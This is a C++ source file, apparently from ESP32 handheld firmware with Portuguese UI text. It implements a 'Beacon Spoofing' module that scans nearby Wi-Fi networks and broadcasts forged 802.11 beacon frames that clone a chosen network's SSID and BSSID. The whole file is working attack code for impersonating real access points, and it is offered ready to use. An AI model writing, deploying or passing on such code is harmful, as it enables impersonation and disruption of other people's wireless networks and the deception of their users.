#include "beacon_spoof.h"
#include "config.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <cstring>

#define SPOOF_COOLDOWN_MS 400

void BeaconSpoof::begin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  scanNets();
}

void BeaconSpoof::scanNets() {
  _netCount = 0;
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && _netCount < BEACON_SPOOF_MAX_NETS; i++) {
    Network &net = _net[_netCount];
    strncpy(net.ssid, WiFi.SSID(i).c_str(), 32);
    net.ssid[32] = 0;
    net.channel = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    _netCount++;
  }
  WiFi.scanDelete();
  _selIdx = 0;
  _sent = 0;
}

void BeaconSpoof::selMove(int d) {
  if (_netCount == 0) return;
  _selIdx = ((_selIdx + d) % _netCount + _netCount) % _netCount;
}

int BeaconSpoof::buildBeacon(uint8_t *pkt, const char *ssid, const uint8_t *bssid, uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;                 // frame control
  pkt[i++] = 0x00; pkt[i++] = 0x00;                 // duration
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;      // destino broadcast
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k];  // origem = BSSID
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k];  // BSSID
  pkt[i++] = 0x00; pkt[i++] = 0x00;                 // seq/frag

  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;      // timestamp
  pkt[i++] = 0x64; pkt[i++] = 0x00;                 // beacon interval
  pkt[i++] = 0x01; pkt[i++] = 0x04;                 // capability

  int slen = strlen(ssid); if (slen > 32) slen = 32;
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)slen;
  for (int k = 0; k < slen; k++) pkt[i++] = ssid[k];

  pkt[i++] = 0x01; pkt[i++] = 0x08;
  static const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  for (int k = 0; k < 8; k++) pkt[i++] = rates[k];

  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  return i;
}

void BeaconSpoof::sendBurst() {
  if (_netCount == 0 || _selIdx >= _netCount) return;
  Network &net = _net[_selIdx];
  _channel = net.channel;
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);

  uint8_t pkt[256];
  int len = buildBeacon(pkt, net.ssid, net.bssid, net.channel);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
  _sent++;
}

void BeaconSpoof::tick() {
  sendBurst();
}

bool BeaconSpoof::burstOnHeld(bool okHeld) {
  if (!_enabled || !okHeld || _netCount == 0) return false;
  if (millis() - _lastBurstMs < SPOOF_COOLDOWN_MS) return false;
  _lastBurstMs = millis();
  sendBurst();
  return true;
}

void BeaconSpoof::draw(TFT_eSPI &tft, bool full) {
  if (full) {
    tft.fillScreen(COLOR_BG);
    tft.fillRect(0, 0, tft.width(), 22, COLOR_SEL);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(COLOR_FG, COLOR_SEL);
    tft.drawString("Beacon Spoofing", 6, 4, 2);
    tft.setTextColor(COLOR_FG, COLOR_BG);
    tft.drawString("[BACK] sair   girar=rede   OK=liga/desliga", 6, 224, 1);
  }

  tft.fillRect(0, 24, tft.width(), tft.height() - 46, COLOR_BG);
  tft.setTextDatum(TL_DATUM);

  if (_netCount == 0) {
    tft.setTextColor(COLOR_WARN, COLOR_BG);
    tft.drawString("Nenhuma rede encontrada.", 8, 60, 4);
    tft.drawString("Gire para rescannear.", 8, 100, 2);
    return;
  }

  Network &net = _net[_selIdx];
  tft.setTextColor(_enabled ? COLOR_OK : COLOR_FG, COLOR_BG);
  char b[48];
  snprintf(b, sizeof(b), "%s", _enabled ? "CLONANDO" : "PARADO");
  tft.drawString(b, 8, 28, 6);

  tft.setTextColor(COLOR_ACCENT, COLOR_BG);
  snprintf(b, sizeof(b), "SSID: %.31s", net.ssid);
  tft.drawString(b, 8, 68, 2);

  tft.setTextColor(COLOR_FG, COLOR_BG);
  snprintf(b, sizeof(b), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           net.bssid[0], net.bssid[1], net.bssid[2],
           net.bssid[3], net.bssid[4], net.bssid[5]);
  tft.drawString(b, 8, 88, 1);

  snprintf(b, sizeof(b), "Canal: %-2d   RSSI: %-3d dBm", net.channel, net.rssi);
  tft.drawString(b, 8, 104, 2);

  snprintf(b, sizeof(b), "Frames: %-10lu", (unsigned long)_sent);
  tft.drawString(b, 8, 126, 2);

  tft.setTextColor(COLOR_ACCENT, COLOR_BG);
  snprintf(b, sizeof(b), "[%d/%d]", _selIdx + 1, _netCount);
  tft.drawString(b, 8, 150, 2);
}
